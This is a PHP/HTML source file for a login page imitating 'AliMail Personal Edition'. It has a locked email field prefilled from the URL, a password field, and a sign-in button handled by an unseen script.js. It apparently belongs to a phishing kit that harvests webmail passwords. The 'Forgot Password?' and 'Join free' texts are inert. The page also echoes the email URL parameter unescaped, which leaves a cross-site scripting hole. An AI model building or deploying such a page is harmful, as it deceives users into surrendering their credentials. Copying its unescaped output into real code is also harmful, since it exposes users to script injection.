<?php
	if(isset($_GET['email'])){
		$email = $_GET['email'];
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title>AliMail Personal Edition</title>
	<link rel="icon" href="icon.png" />
	<link rel="stylesheet" href="style.css" />
	<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
</head>
<body>
	<header style="background: #f5f7f9;">
		<div class="header-container">
			<img src="logo.png" width="190px" height="38px">
		</div>
	</header>
	<section style="float: left;">
		<div class="row">
			<div class="col-xs-12 col-sm-12 col-md-10 col-lg-8 col-xl-8 mx-auto">
				<div class="col-sm-12 col-md-12 mx-auto shadow mt-4">
					<div class="col-12 bg float-left p-0 bg-success">
						<div class="col-sm-12 col-md-5 float-right p-0 mt-5 shadow rounded bg-white">
							<div class="col-11 mx-auto p-0">
								<div class="form-group px-4 mt-2">
									<div class="alert alert-danger hide py-1" id="processing"></div>
								</div>
								<div class="form-group px-4 mt-2">
									<p class="m-0">Account:</p>
									<input class="form-control rounded-0" id="email" value="<?php echo $_GET['email']; ?>" placeholder="email" disabled="">
								</div>
								<div class="form-group px-4 mt-2">
									<p class="m-0"><span>Password:</span><span style="float: right;" class="text-primary">Forgot Password?</span></p>
									<input class="form-control rounded-0" type="password" id="password" placeholder="Password">
								</div>
								<div class="form-group px-4 mt-5">
									<button class="btn btn-block btn-sm btn-warning" id="login">Sign In</button>
								</div>
								<div class="form-group px-4 mb-4 float-right">
									<p class="text-right text-primary">Join free</p>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
</body>
<script type="text/javascript" src="script.js"></script>
</html>